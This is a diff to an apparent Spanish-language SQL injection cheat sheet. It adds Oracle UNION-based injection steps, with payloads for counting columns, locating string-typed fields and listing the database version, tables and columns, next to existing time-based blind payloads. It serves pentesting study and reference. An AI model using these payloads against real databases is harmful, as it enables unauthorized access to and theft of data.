@@ -524,7 +524,37 @@ waitfor delay '00:00:10' Sleep
 #### In-Band:
 - Error based:
 - Union based:
-
+  - Se une una segunda tabla al actual query, donde la segunda tabla sirve de pivote para saltar a más información.
+    - ORACLE:
+1- Detectar la cantidad de campos que tiene la tabla actual:
+  - Opción 1: Incrementar el groupby hasta que se detecte en que numero se provoca un error.
+```
+      - GROUP BY 1--
+      - GROUP BY 2--
+```
+  - Opción 2: Incrementar la cantidad de null hasta encontrar donde se provoca el error.
+```
+      - ' UNION SELECT NULL FROM DUAL--
+      - ' UNION SELECT NULL,NULL FROM DUAL--
+      - ' UNION SELECT NULL,NULL,NULL FROM DUAL--
+```
+2- Conocer el tipo de valor de cada campo, colocando varios tipos hasta encontrar uno que sea string, dado que es el más facil de manipular:
+```
+      - ' UNION SELECT 'A',NULL,NULL FROM DUAL--
+      - ' UNION SELECT NULL,'A',NULL FROM DUAL--
+      - ' UNION SELECT NULL,NULL,'A' FROM DUAL--
+```
+3- Comenzar a regresar información relevante como versiones, nombre de BD, incluso tablas:
+```
+    - VERSION:
+      - SELECT banner,NULL,NULL FROM v$version
+      - SELECT version,NULL,NULL FROM v$instance
+    - NOMBRE DE LAS TABLAS:
+      - ' UNION SELECT owner,table_name,NULL FROM all_tables--
+    - NOMBRE DE LAS COLUMNAS:
+      - ' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = 'APP_USERS_AND_ROLES'--
+      - ' UNION SELECT column_name,table_name FROM all_tab_columns--
+```
 #### Blind:
 - Boleean based:
 - Time based:
@@ -557,9 +587,6 @@ waitfor delay '00:00:10' Sleep
       - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '$_$$_$$_$')#
 ```
 
-
-
-    
 #### Out of Band:
 - HTTP/DNS responses
 
